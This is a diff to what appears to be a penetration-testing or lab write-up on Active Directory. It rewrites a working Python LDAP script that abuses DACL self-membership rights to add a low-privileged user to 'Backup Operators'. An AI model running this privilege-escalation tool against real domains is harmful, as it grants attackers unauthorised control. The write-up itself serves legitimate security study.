@@ -103,93 +103,156 @@ python3 examples/dacledit.py -principal lowpriv -target 'Backup Operators' -dc-i
 **Create LDAP script (addusertogroup.py):**
 
 ```python
-# Import necessary modules
+
+#!/usr/bin/env python3
+"""
+LDAP Group Membership Modifier
+Adds users to Active Directory groups via direct LDAP operations.
+Useful for abusing Self-Membership and other attribute-level DACL rights
+that don't work through legacy SAMR/RPC interfaces.
+
+"""
+
 import argparse
 import sys
-from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD, MODIFY_REPLACE, MODIFY_DELETE
+from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD
+from ldap3.core.exceptions import LDAPException
 
-# Parse command-line arguments
-parser = argparse.ArgumentParser(description='Add a user to an Active Directory group.')
-parser.add_argument('-d','--domain', required=True, help='The domain name of the Active Directory server.')
-parser.add_argument('-g','--group', required=True, help='The name of the group to add the user to.')
-parser.add_argument('-a','--adduser', required=True, help='The username of the user to add.')
-parser.add_argument('-u','--user', required=True, help='The username of an Active Directory user with AddMember privilege.')
-parser.add_argument('-p','--password', required=True, help='The password of the Active Directory user.')
-args = parser.parse_args()
 
-# Extract values from command-line arguments
-domain_name = args.domain
-group_name = args.group
-user_name = args.adduser
-ad_username = args.user
-ad_password = args.password
+class LDAPGroupManager:
+    def __init__(self, domain, username, password):
+        self.domain = domain
+        self.username = username
+        self.password = password
+        self.connection = None
+        self.base_dn = self._build_base_dn()
+        
+    def _build_base_dn(self):
+        """Convert domain.local to DC=domain,DC=local"""
+        return ','.join([f'DC={part}' for part in self.domain.split('.')])
+    
+    def connect(self):
+        """Establish LDAP connection to domain controller"""
+        try:
+            server = Server(self.domain, get_info=ALL)
+            self.connection = Connection(
+                server,
+                user=f'{self.domain}\\{self.username}',
+                password=self.password,
+                authentication=NTLM,
+                auto_bind=True
+            )
+            print(f'[+] Successfully connected to {self.domain}')
+            return True
+        except LDAPException as e:
+            print(f'[-] Connection failed: {e}')
+            return False
+    
+    def _find_object_dn(self, object_name, object_class):
+        """Generic search for AD object DN by name and class"""
+        search_filter = f'(&(objectClass={object_class})(|(cn={object_name})(sAMAccountName={object_name})))'
+        
+        self.connection.search(
+            search_base=self.base_dn,
+            search_filter=search_filter,
+            attributes=['distinguishedName']
+        )
+        
+        if self.connection.entries:
+            dn = self.connection.entries[0].distinguishedName.value
+            print(f'[+] Found {object_class}: {object_name}')
+            return dn
+        else:
+            print(f'[-] {object_class.capitalize()} not found: {object_name}')
+            return None
+    
+    def get_group_members(self, group_name):
+        """Retrieve current group members"""
+        group_dn = self._find_object_dn(group_name, 'group')
+        if not group_dn:
+            return None
+        
+        self.connection.search(
+            search_base=group_dn,
+            search_filter='(objectClass=group)',
+            attributes=['member']
+        )
+        
+        if self.connection.entries and hasattr(self.connection.entries[0], 'member'):
+            return self.connection.entries[0].member.values
+        return []
+    
+    def add_member(self, group_name, user_name):
+        """Add user to group via LDAP modify operation"""
+        # Get group DN
+        group_dn = self._find_object_dn(group_name, 'group')
+        if not group_dn:
+            return False
+        
+        # Get user DN
+        user_dn = self._find_object_dn(user_name, 'user')
+        if not user_dn:
+            return False
+        
+        # Check if already member
+        current_members = self.get_group_members(group_name)
+        if user_dn in current_members:
+            print(f'[!] {user_name} is already a member of {group_name}')
+            return True
+        
+        # Add to group
+        try:
+            success = self.connection.modify(
+                group_dn,
+                {'member': [(MODIFY_ADD, [user_dn])]}
+            )
+            
+            if success:
+                print(f'[+] Successfully added {user_name} to {group_name}')
+                return True
+            else:
+                print(f'[-] Failed to add user: {self.connection.result}')
+                return False
+                
+        except LDAPException as e:
+            print(f'[-] LDAP modification error: {e}')
+            return False
 
-# Construct the search base from the domain name
-search_base = 'dc=' + ',dc='.join(domain_name.split('.'))
 
-# Create a connection to the Active Directory server
-server = Server(domain_name, get_info=ALL)
-conn = Connection(
-    server,
-    user=f'{domain_name}\\{ad_username}',
-    password=ad_password,
-    authentication=NTLM
-)
-
-# Bind to the server with the given credentials
-if conn.bind():
-    print('[+] Connected to Active Directory successfully.')
-else:
-    print('[-] Error: failed to bind to the Active Directory server.')
-    sys.exit(1)
-
-# Search for the group with the given name
-conn.search(
-    search_base=search_base,
-    search_filter=f'(&(objectClass=group)(cn={group_name}))',
-    attributes=['member']
-)
-
-# Check if the group was found
-if conn.entries:
-    print('[+] Group ' + group_name + ' found.')
-else:
-    print('[-] Error: group not found.')
-    sys.exit(1)
-
-# Extract the group's DN and member list
-group_dn = conn.entries[0].entry_dn
-members = conn.entries[0].member.values
-
-# Search for the user with the given username
-conn.search(
-    search_base=search_base,
-    search_filter=f'(&(objectClass=user)(sAMAccountName={user_name}))',
-    attributes=['distinguishedName']
-)
-
-# Check if the user was found
-if conn.entries:
-    print('[+] User ' + user_name + ' found.')
-else:
-    print('[-] Error: user not found.')
-    sys.exit(1)
-
-# Extract the user's DN
-user_dn = conn.entries[0].distinguishedName.value
-
-# Check if the user is already a member of the group
-if user_dn in members:
-    print('[+] User is already a member of the group.')
-else:
-    # Add the user to the group
-    if conn.modify(
-        dn=group_dn,
-        changes={'member': [(MODIFY_ADD, [user_dn])]}
-    ):
-        print('[+] User added to group successfully.')
+def main():
+    parser = argparse.ArgumentParser(
+        description='Add users to Active Directory groups via LDAP',
+        epilog='Example: %(prog)s -d corp.local -u lowpriv -p Password123 -g "Backup Operators" -m lowpriv'
+    )
+    
+    parser.add_argument('-d', '--domain', required=True,
+                       help='Target domain (e.g., corp.local)')
+    parser.add_argument('-u', '--username', required=True,
+                       help='Username with group modification rights')
+    parser.add_argument('-p', '--password', required=True,
+                       help='Password for authentication')
+    parser.add_argument('-g', '--group', required=True,
+                       help='Target group name')
+    parser.add_argument('-m', '--member', required=True,
+                       help='Username to add to group')
+    
+    args = parser.parse_args()
+    
+    # Initialize manager and connect
+    manager = LDAPGroupManager(args.domain, args.username, args.password)
+    
+    if not manager.connect():
+        sys.exit(1)
+    
+    # Add member to group
+    if manager.add_member(args.group, args.member):
+        sys.exit(0)
     else:
-        print('[-] There was an error trying to add the user to the group.')
+        sys.exit(1)
+
+
+if __name__ == '__main__':
+    main()
 ```
 
 **Execute the script:**
